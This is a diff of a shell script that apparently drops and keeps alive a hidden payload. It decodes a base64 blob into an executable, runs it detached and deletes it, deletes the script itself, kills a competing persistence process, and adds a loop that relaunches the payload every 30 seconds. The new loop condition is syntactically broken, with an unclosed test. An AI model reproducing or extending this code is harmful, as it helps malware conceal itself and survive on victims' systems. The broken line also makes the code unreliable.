@@ -30,6 +30,13 @@ jumpto() {
 	exit
 }
 
+execute_command () {
+	echo "$b64" | base64 -d > $COMMAND
+	chmod +x $COMMAND
+	(${COMMAND} &)&
+	rm -f $COMMAND
+}
+
 encoded=${1:-"encoded"}
 
 jumpto $encoded
@@ -38,16 +45,15 @@ main:
 
 trap backup_script EXIT SIGTERM SIGKILL
 rm -- "$0"
-echo "$b64" | base64 -d > $COMMAND
-chmod +x $COMMAND
-(${COMMAND} &)&
-rm -f $COMMAND
 if pgrep $(basename $PERSIST); then
 	PERSIST_PID=$(ps -o ppid= $(pgrep $(basename $PERSIST | tr -d " ")))
 	sleep 3
 	kill $PERSIST_PID
 fi
-while true; do
+while [[ "$KEEP_ALIVE" == "true"; do
+	if ! pgrep -f $COMMAND; then
+		execute_command
+	fi
 	sleep 30
 done
 exit
